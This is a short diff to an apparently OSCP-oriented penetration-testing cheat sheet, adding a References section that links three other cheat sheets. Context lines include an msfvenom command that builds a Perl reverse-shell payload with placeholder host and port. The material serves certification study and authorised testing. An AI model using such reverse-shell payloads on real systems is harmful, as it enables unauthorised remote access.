@@ -112,6 +112,8 @@
 
     - [Perl](#perl)
 
+13. [References](#references)
+
 ## Common Commands
 
 Python HTTP Server: <code>python -m SimpleHTTPServer [PORT]</code>
@@ -553,3 +555,11 @@ Append <code><?php</code>
 ### Perl
 
 <code>msfvenom -p cmd/unix/reverse_perl LHOST=[LOCAL_IP] LPORT=[PORT] -f raw > shell.pl</code>
+
+## References
+
+[Liodeus Cheat Sheet](https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html)
+
+[Ultimate Cheat Sheet](https://www.bytefellow.com/oscp-ultimate-cheatsheet/)
+
+[akenofu Cheat Sheet](https://github.com/akenofu/OSCP-Cheat-Sheet)
